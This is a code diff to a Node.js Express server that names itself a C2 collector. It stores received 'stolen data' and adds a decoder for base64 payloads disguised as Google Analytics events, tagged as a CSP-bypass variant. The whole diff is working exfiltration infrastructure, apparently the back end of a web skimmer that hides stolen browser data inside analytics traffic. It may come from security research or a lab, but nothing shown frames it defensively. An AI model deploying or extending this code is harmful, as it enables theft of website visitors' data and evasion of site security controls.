@@ -18,7 +18,7 @@ const cors = require('cors')
 const app = express()
 // Use PORT env var (Cloud Run sets PORT=8080), default to 3000 for local dev
 const PORT = process.env.PORT || 3000
-const DATA_DIR = path.join(__dirname, 'stolen-data')
+const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'stolen-data')
 
 // Trust the GFE/Cloud Run proxy so req.ip reflects X-Forwarded-For
 app.set('trust proxy', true)
@@ -79,6 +79,68 @@ async function appendToMasterLog(data) {
     await fs.appendFile(logPath, logEntry, 'utf8')
   } catch (error) {
     console.error('[C2] Failed to append to master log:', error)
+  }
+}
+
+function decodeAnalyticsEnvelope(body) {
+  if (!body || typeof body !== 'object' || !body.analyticsEnvelope) {
+    return null
+  }
+
+  const encodedPayload = body.params?.event_label
+  if (!encodedPayload || typeof encodedPayload !== 'string') {
+    return null
+  }
+
+  try {
+    const decoded = Buffer.from(encodedPayload, 'base64').toString('utf8')
+    const parsed = JSON.parse(decoded)
+
+    if (!parsed || typeof parsed !== 'object') {
+      return null
+    }
+
+    delete parsed.__proto__
+    delete parsed.constructor
+
+    const analytics = {
+      provider: body.provider || 'google-analytics',
+      version: body.version || 'unknown',
+      source: body.source || 'unknown',
+      measurementId: body.measurementId || '',
+      clientId: body.clientId || '',
+      eventName: body.eventName || '',
+      eventCategory: body.params?.event_category || '',
+      eventLabelLength: encodedPayload.length,
+      page: body.page || {}
+    }
+
+    parsed.analytics = analytics
+    parsed.metadata = {
+      ...(parsed.metadata || {}),
+      collectionMethod:
+        parsed.metadata?.collectionMethod || 'google-analytics-csp-bypass-variant'
+    }
+
+    return parsed
+  } catch (error) {
+    console.error('[C2] Failed to decode analytics envelope:', error)
+    return null
+  }
+}
+
+function normalizeStolenData(body) {
+  const analyticsPayload = decodeAnalyticsEnvelope(body)
+  if (analyticsPayload) {
+    return {
+      stolenData: analyticsPayload,
+      receiveMode: 'analytics-envelope'
+    }
+  }
+
+  return {
+    stolenData: body,
+    receiveMode: 'direct-post'
   }
 }
 
@@ -145,13 +207,15 @@ app.post('/collect', async (req, res) => {
   console.log('[C2] Request body keys:', Object.keys(req.body || {}))
 
   try {
-    const stolenData = req.body
+    const { stolenData, receiveMode } = normalizeStolenData(req.body)
+    console.log('[C2] Receive mode:', receiveMode)
 
     // Add server-side metadata
     stolenData.server = {
       receivedAt: new Date().toISOString(),
       clientIP: clientIP,
-      userAgent: req.get('user-agent')
+      userAgent: req.get('user-agent'),
+      receiveMode: receiveMode
     }
 
     // Validate the data
